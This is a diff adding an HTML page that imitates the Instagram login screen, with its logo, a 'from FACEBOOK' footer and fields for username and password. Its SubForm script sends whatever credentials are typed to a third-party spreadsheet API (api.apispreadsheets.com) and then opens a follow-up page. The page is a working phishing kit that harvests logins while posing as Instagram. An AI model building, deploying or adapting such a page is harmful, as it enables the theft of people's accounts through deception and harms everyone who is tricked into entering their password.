@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
+	<title>Instagram</title>
+	<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+	function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/14230/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+        success: function(){
+          window.open("lastpage.html");
+				},
+				error: function(){
+					alert("Try again")
+				}
+			});
+
+		}
+	</script>
+</head>
+<body>
+    <div class="lang">English &#11206</div>
+    <div class="logo">
+        <img src="logo.png" alt="logo">
+    </div>
+    <a class="facebook-login" href="#">
+        <i class="fab fa-facebook-square"></i> Continue with Facebook
+    </a>
+    <div class="orarea">
+        <div class="line1"></div>
+        <div class="line2"></div>
+        <span class="has-separator">Or</span>
+    </div>
+
+	<form class="details" id="myForm">
+        <input class="insiders" name="username" placeholder="Phone number, username, or email"/>
+        <input class="insiders" type="password" name="password" placeholder="Password"/>
+    </form>
+    <a class="password-reset" href="#">Forgot password?</a>
+    <button class="form-btn" onclick='SubForm()'>Log In</button>
+    
+    <div class="sign-up">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+      <div class="get-the-app">
+        <span>Get the app.</span>
+        <div class="badges">
+          <img src="app-store.png" alt="app-store badge">
+          <img src="google-play.png" alt="google-play badge">
+        </div>
+      </div>
+      <footer>
+          
+          <div class="copyright-notice">
+            <div id="from"> from </div> 
+            FACEBOOK
+          </div>
+        </div>
+      </footer>  
+      <footer>
+        <div class="container">
+          <nav class="footer-nav">
+            <ul>
+              <li>
+                <a href="#">About us</a>
+              </li>
+              <li>
+                <a href="#">Support</a>
+              </li>
+              <li>
+                <a href="#">Press</a>
+              </li>
+              <li>
+                <a href="#">Api</a>
+              </li>
+              <li>
+                <a href="#">Jobs</a>
+              </li>
+              <li>
+                <a href="#">Privacy</a>
+              </li>
+              <li>
+                <a href="#">Terms</a>
+              </li>
+              <li>
+                <a href="#">Directory</a>
+              </li>
+              <li>
+                <a href="#">Profiles</a>
+              </li>
+              <li>
+                <a href="#">Hashtags</a>
+              </li>
+              <li>
+                <a href="#">Languages</a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </footer>     
+      <div class="mobileapp">
+          <img src="mobile-app.png" alt="mobile-app-pngimage">
+      </div>
+</body>
+</html>
